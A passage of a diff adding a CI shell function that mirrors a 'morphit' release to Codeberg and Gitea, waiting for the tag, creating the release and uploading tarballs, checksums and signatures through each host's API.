+              TC=$(curl -sS -o /dev/null -w '%{http_code}' -H "$AUTH" "${API}/repos/${REPO}/tags/${TAG}" || echo 000)
+              [ "$TC" = "200" ] && break
+              i=$((i + 1)); sleep 10
+            done
+            if [ "$TC" != "200" ]; then
+              echo "::warning::${HOST}: tag ${TAG} not mirrored yet (HTTP ${TC} after ~2m) — skipping this mirror this run."
+              return 0
+            fi
+            # Create (or reuse) the release for this tag.
+            CODE=$(curl -sS -o /tmp/mrel.json -w '%{http_code}' -X POST \
+              -H "$AUTH" -H 'Content-Type: application/json' \
+              --data-binary @/tmp/mrel-create.json "${API}/repos/${REPO}/releases" || echo 000)
+            if [ "$CODE" = "201" ]; then
+              echo "${HOST}: created release ${TAG}."
+            elif [ "$CODE" = "409" ]; then
+              echo "${HOST}: release ${TAG} already exists; will attach assets."
+              curl -sS -H "$AUTH" -o /tmp/mrel.json "${API}/repos/${REPO}/releases/tags/${TAG}" || true
+            else
+              echo "::warning::${HOST}: could not create the release (HTTP ${CODE}) — skipping this mirror."
+              cat /tmp/mrel.json || true
+              return 0
+            fi
+            REL_ID=$(node -e 'try{const o=JSON.parse(require("fs").readFileSync("/tmp/mrel.json","utf8"));process.stdout.write(String(o.id||""))}catch(e){}')
+            if [ -z "${REL_ID:-}" ]; then
+              echo "::warning::${HOST}: no release id in API response — skipping asset upload."
+              return 0
+            fi
+            # Attach each asset that exists (same set the primary attaches).
+            for f in "$TARBALL" "$TARBALL.sha256" "$TARBALL.asc" distribution-anchor.env \
+                     "morphit-${TAG}-offline.tar.gz" "morphit-${TAG}-offline.tar.gz.sha256"; do
+              [ -f "$f" ] || continue
+              NAME=$(basename "$f")
+              CODE=$(curl -sS -o /tmp/masset.json -w '%{http_code}' -X POST \
+                -H "$AUTH" -F "attachment=@${f}" \
+                "${API}/repos/${REPO}/releases/${REL_ID}/assets?name=${NAME}" || echo 000)
+              if [ "$CODE" = "201" ]; then
+                echo "${HOST}: attached ${NAME}"
+              else
+                echo "::warning::${HOST}: attaching ${NAME} failed (HTTP ${CODE})."
+              fi
+            done
+            echo "${HOST}: release mirror done."
+          }
+          publish_to "codeberg.org" "agorise/morphit" "${CODEBERG_TOKEN:-}"
+          publish_to "gitea.com" "agorise/morphit" "${GITEA_COM_TOKEN:-}"
+          echo "✓ mirror-publish step complete (mirrors are best-effort; primary is the anchor)."
